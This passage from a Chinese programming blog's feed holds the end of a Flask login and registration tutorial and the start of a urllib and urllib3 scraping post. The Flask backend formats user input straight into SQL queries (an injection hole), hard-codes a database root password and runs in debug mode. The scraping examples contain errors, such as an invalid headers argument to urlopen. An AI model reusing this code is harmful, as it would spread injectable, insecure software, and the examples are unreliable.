class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> x = $(<span class="string">&quot;#u&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (x != <span class="string">&quot;&quot;</span> &amp;&amp; x != <span class="string">&quot; &quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&quot;&#123;&#123; url_for(&#x27;login_in&#x27;) &#125;&#125;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">sign_in_name</span>: x</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">dataType</span>: <span class="string">&quot;html&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (data == <span class="string">&#x27;none&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">alert</span>(<span class="string">&quot;没有此用户&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;./login&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>本段代码为登录和注册页面<br>head.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hi<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://lib.sinaapp.com/js/jquery/2.0.2/jquery-2.0.2.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% block body %&#125;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本段代码主要为引入jq文件</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;head.html&quot; %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">&#123;% if user %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123; user &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h</span>&gt;</span>your are the &#123;&#123; uid &#125;&#125;th user in our site<span class="tag">&lt;/<span class="name">h</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;logout()&quot;</span>&gt;</span>登出<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">id</span>=<span class="string">&quot;t&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;ti&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span>&#123;&#123; users_x &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">&quot;Javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">window</span>).<span class="title function_">load</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> t = $(<span class="string">&quot;#t&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> $(<span class="string">&quot;#ti&quot;</span>).<span class="property">value</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">debug</span>(key);</span></span><br><span class="line"><span class="language-javascript">            t.<span class="title function_">append</span>(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> + key[<span class="number">1</span>] + <span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span> + key[<span class="number">1</span>] + <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">logout</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">url</span>: <span class="string">&quot;/login?l=1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">dataType</span>: <span class="string">&quot;html&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                location.<span class="title function_">reload</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;login()&quot;</span>&gt;</span>登入/注册<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>please enter your name<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">&quot;Javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;./login_in&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;%  endif  %&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>本段代码为首页</p><h4 id="4-7-3-后端代码"><a href="#4-7-3-后端代码" class="headerlink" title="4.7.3 后端代码"></a>4.7.3 后端代码</h4><p>run.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, url_for, request, render_template, redirect, session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta  <span class="comment"># 导入过期时间库</span></span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_folder=<span class="string">&#x27;files&#x27;</span>, static_url_path=<span class="string">&quot;/files&quot;</span>)</span><br><span class="line"><span class="comment"># app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(24) # 每一次服务器启动后，SECRET_KEY不一样 </span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;sadasfas&quot;</span></span><br><span class="line"><span class="comment"># app.config[&#x27;PERMANENT_SESSION_LIFETIME&#x27;] = timedelta(days=7)  # 配置过期时间</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    l = request.args.get(<span class="string">&#x27;l&#x27;</span>, <span class="number">0</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line">    <span class="keyword">if</span> l == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;登出&quot;</span>)</span><br><span class="line">        session.pop(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;首页登录成功&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, users_x=get_users(), user=session[<span class="string">&#x27;user&#x27;</span>], uid=num_user(session[<span class="string">&#x27;user&#x27;</span>]))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login_in&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_in</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已登录&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;502.html&#x27;</span>)</span><br><span class="line">    u = request.args.get(<span class="string">&#x27;sign_up_name&#x27;</span>, <span class="string">&#x27;none&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">if</span> u != <span class="string">&#x27;none&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;登录成功&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> new_user(u)</span><br><span class="line">    u = request.args.get(<span class="string">&#x27;sign_in_name&#x27;</span>, <span class="string">&#x27;none&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">if</span> u != <span class="string">&#x27;none&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> news(u)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">news</span>(<span class="params">namea</span>):</span><br><span class="line">    <span class="keyword">if</span>(num_user(namea) == <span class="string">&quot;&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有用户&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;none&#x27;</span>  <span class="comment"># 无用户</span></span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = namea</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 注册</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_user</span>(<span class="params">namea</span>):</span><br><span class="line">    <span class="comment"># 打开数据库连接</span></span><br><span class="line">    db = MySQLdb.connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;air123456&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;web&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据库连接成功&quot;</span>)</span><br><span class="line">    <span class="comment"># 使用cursor()方法获取操作游标</span></span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;插入新用户&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(num_user(namea) != <span class="string">&quot;&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用户名被注册&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;haven&quot;</span>  <span class="comment"># 有这个用户</span></span><br><span class="line">    <span class="comment"># SQL 插入语句</span></span><br><span class="line">    sql = <span class="string">&quot;&quot;&quot;INSERT ignore INTO users(name,udate)VALUES (&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;&quot;&quot;</span> % (</span><br><span class="line">        namea, time.strftime(<span class="string">r&quot;%Y-%m-%d&quot;</span>, time.localtime()))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 执行sql语句</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        <span class="comment"># 提交到数据库执行</span></span><br><span class="line">        db.commit()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment"># 发生错误时回滚</span></span><br><span class="line">        db.rollback()</span><br><span class="line">    db.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = namea</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_users</span>():</span><br><span class="line">    db = MySQLdb.connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;air123456&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;web&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据库连接&quot;</span>)</span><br><span class="line">    <span class="comment"># 使用cursor()方法获取操作游标</span></span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;取用户列表&quot;</span>)</span><br><span class="line">    <span class="comment"># SQL 插入语句</span></span><br><span class="line">    sql = <span class="string">&quot;SELECT * FROM users&quot;</span></span><br><span class="line">    <span class="comment"># 执行sql语句</span></span><br><span class="line">    cursor.execute(sql)</span><br><span class="line">    <span class="comment"># 提交到数据库执行</span></span><br><span class="line">    db.commit()</span><br><span class="line">    results = cursor.fetchall()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">    db.close()</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num_user</span>(<span class="params">namea</span>):</span><br><span class="line">    <span class="comment"># 打开数据库连接</span></span><br><span class="line">    db = MySQLdb.connect(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;air123456&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;web&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据库连接&quot;</span>)</span><br><span class="line">    <span class="comment"># 使用cursor()方法获取操作游标</span></span><br><span class="line">    cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SQL 插入语句</span></span><br><span class="line">    sql = <span class="string">&quot;SELECT * FROM users WHERE name = &#x27;%s&#x27;&quot;</span> % (namea)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;取注册位数&quot;</span>)</span><br><span class="line">    <span class="comment"># 执行sql语句</span></span><br><span class="line">    cursor.execute(sql)</span><br><span class="line">    <span class="comment"># 提交到数据库执行</span></span><br><span class="line">    db.commit()</span><br><span class="line">    results = cursor.fetchall()</span><br><span class="line">    ida = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> results:</span><br><span class="line">        <span class="comment"># 打印结果</span></span><br><span class="line">        ida = row[<span class="number">0</span>]</span><br><span class="line">    db.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ida</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>,  debug=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 关闭数据库连接</span></span><br><span class="line"><span class="comment"># db.close()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ###</span></span><br><span class="line"><span class="comment"># CREATE TABLE IF NOT EXISTS `users`(</span></span><br><span class="line"><span class="comment">#         `uid` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">#         `name` VARCHAR(100) NOT NULL,</span></span><br><span class="line"><span class="comment">#     `udate` DATE NOT NULL,</span></span><br><span class="line"><span class="comment">#         PRIMARY KEY ( `uid` )</span></span><br><span class="line"><span class="comment">#      )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span></span><br><span class="line"><span class="comment">#       ALTER TABLE users ADD unique(`name`)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ###</span></span><br></pre></td></tr></table></figure><h3 id="4-8-运行"><a href="#4-8-运行" class="headerlink" title="4.8 运行"></a>4.8 运行</h3><p>在当前目录下，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python run.py</span><br></pre></td></tr></table></figure><p><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-14.png" alt="结果图"></p><center>--END--</center>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Html,Js,Css </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python使用urllib/urllib3/requests库+beautifulsoup爬取网页</title>
      <link href="/2020/01/06/Python%E4%BD%BF%E7%94%A8urllib,urllib3,requests%E5%BA%93+beautifulsoup%E7%88%AC%E5%8F%96%E7%BD%91%E9%A1%B5/"/>
      <url>/2020/01/06/Python%E4%BD%BF%E7%94%A8urllib,urllib3,requests%E5%BA%93+beautifulsoup%E7%88%AC%E5%8F%96%E7%BD%91%E9%A1%B5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>测试环境是python 3.8.1</p></blockquote><h2 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h2><p>urllib提供了一系列用于操作URL的功能。<br>urllib的request模块可以非常方便地抓取URL内容，也就是发送一个GET请求到指定的页面，然后返回HTTP的响应。</p><p>使用pip下载:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install urllib</span><br></pre></td></tr></table></figure><p>例如对百度搜索界面的抓取(<a href="http://www.baidu.com/">www.baidu.com</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html, application/xhtml+xml, */*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/6.1 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.so.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.so.com&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    respond = urllib.request.urlopen(<span class="string">&#x27;http://www.baidu.com&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(respond.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考网站:<br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1019223241745024">廖雪峰的官方网站</a></p><h2 id="urllib3"><a href="#urllib3" class="headerlink" title="urllib3"></a>urllib3</h2><p>urllib3是一个功能强大且友好的Python HTTP客户端。大多数Python生态系统已经使用urllib3，您也应该使用。urllib3带来了Python标准库中缺少的许多关键功能：</p><p>线程安全。<br>连接池。<br>客户端SSL &#x2F; TLS验证。<br>使用分段编码上传文件。<br>重试请求和处理HTTP重定向的助手。<br>支持gzip，deflate和brotli编码。<br>HTTP和SOCKS的代理支持。<br>100％的测试覆盖率。<br>urllib3功能强大且易于使用：<br>下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install urllib3</span><br></pre></td></tr></table></figure><p>例如抓取百度搜索界面(<a href="http://www.baidu.com/">www.baidu.com</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    http = urllib3.PoolManager()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html, application/xhtml+xml, */*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/6.1 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r=http.request(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://www.baidu.com&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(r.data)</span><br></pre></td></tr></table></figure><h2 id="requests"><a href="#requests" class="headerlink" 